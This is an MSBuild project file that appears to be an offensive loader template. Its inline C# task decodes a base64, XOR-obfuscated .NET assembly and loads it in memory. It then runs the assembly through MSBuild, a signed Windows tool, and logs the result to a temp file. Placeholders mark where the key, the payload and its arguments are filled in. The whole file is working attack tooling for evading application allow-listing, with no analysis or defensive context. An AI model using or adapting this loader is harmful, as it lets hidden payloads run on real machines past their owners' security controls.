<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="c">
   <c/>
  </Target>
  <UsingTask
    TaskName="c"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
  <Task>
    <Reference Include="System.Management.Automation"/>
      <Code Type="Class" Language="cs">
        <![CDATA[
using System;
using System.IO;
using System.Reflection;
using System.Text;

namespace csharp
{
    class Program
    {
        private static byte[] Zor(byte[] input, byte[] key)
        {
            byte[] mixed = new byte[input.Length];
            for (int i = 0; i < input.Length; i++)
            {
                mixed[i] = (byte)(input[i] ^ key[i % key.Length]);
            }
            return mixed;
        }
        public static void Main(string[] args)
        {
            Assembly assem = null;
            string key = "~~KEY~~";
            string path = Environment.GetEnvironmentVariable("TEMP") + "\\__" + key + ".txt";
            StreamWriter writer = File.AppendText(path);
            writer.AutoFlush = true;
            Console.SetOut(writer);
            writer.WriteLine(DateTime.Now.ToString());

            try
            {
                string data = "~~ASSEMBLY~~";
                assem = Assembly.Load(Zor(Convert.FromBase64String(data), Encoding.UTF8.GetBytes(key)));
            }
            catch (Exception e)
            {
                writer.WriteLine("[!] Could not load assembly. Returned the following error:\n\n");
                writer.WriteLine(e);
                Environment.Exit(1);
            }
            
            if (args.Length == 0)
            {
                writer.WriteLine("[*] Running assembly with no arguments");
            }
            else
            {
                writer.WriteLine("[*] Running assembly with arguments: " + string.Join(" ", args));
            }
            try {
                assem.EntryPoint.Invoke(null, new object[] { args });
            }
            catch (Exception e) {
                writer.WriteLine("[!] Could not invoke assembly. Returned the following error:\n\n");
                writer.WriteLine(e);
                Environment.Exit(1);
            }
        }
    }
    public class c : Microsoft.Build.Utilities.Task, Microsoft.Build.Framework.ITask
    {
        public override bool Execute()
        {
            Program.Main(new string[] {~~ARGS~~});
            return true;
        }
   }
}
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>

